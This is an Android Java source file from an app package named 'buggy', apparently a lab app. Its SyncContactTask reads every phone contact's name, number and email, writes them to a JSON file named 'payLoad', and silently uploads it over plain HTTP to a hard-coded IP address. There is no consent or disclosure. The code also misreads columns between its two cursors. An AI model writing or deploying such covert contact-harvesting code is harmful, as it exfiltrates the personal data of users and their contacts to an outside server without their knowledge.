package io.srinathr.labs.buggy.tasks;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.gson.Gson;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import io.srinathr.labs.buggy.pojo.Contact;
import io.srinathr.labs.buggy.utils.MultipartRequestUtil;

public class SyncContactTask extends AsyncTask<String,Void,String> {
    private static final String REQUEST_URI = "http://104.211.226.176:8989/file-api/upload";
    private Context context;

    public SyncContactTask(Context context) {
        super();
        this.context = context;
    }

    @Override
    protected String doInBackground(String... strings) {
        Cursor pCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
        Cursor eCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null, null, null, null);
        List<Contact> contacts = new ArrayList<>();
        if(pCursor != null && pCursor.getCount() > 0) {
            while (pCursor.moveToNext()) {
                String id = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                String name = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                String email = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME));
                contacts.add(new Contact(id,name,number,email));
            }
        }
        if(eCursor != null && eCursor.getCount() > 0) {
            while (eCursor.moveToNext()) {
                String id = eCursor.getString(eCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email._ID));
                String email = eCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                contacts.add(new Contact(id,"","",email));
            }
        }
        File file = getFile("payLoad", context);
        try (Writer fileWriter = new FileWriter(file)){
            fileWriter.write(new Gson().toJson(contacts));
            fileWriter.flush();
            Log.i("BUGGY","File successfully written at "+file.getAbsolutePath());
            uploadFileToServer(file);
            Log.i("BUGGY","File upload success.");
        } catch (IOException e) {
            Log.e("BUGGY","Error writing to file :"+ e.getLocalizedMessage());
        }
        return file.getAbsolutePath();
    }

    private void uploadFileToServer(File file) throws IOException {
        MultipartRequestUtil requestUtil = new MultipartRequestUtil(REQUEST_URI,"UTF-8");
        requestUtil.addFilePart("file",file);
        String response = requestUtil.finish();
        Log.i("BUGGY","File upload response");
    }

    private File getFile(String fileName, Context context) {
        File file;
        try {
            file = new File(context.getExternalFilesDir(null),fileName);
            file.mkdirs();
        } catch (Exception e) {
            Log.e("BUGGY","Error creating file"+e.getLocalizedMessage());
            file = null;
        }
        return new File(file,"data_"+new Date().getTime()+".txt");
    }
}
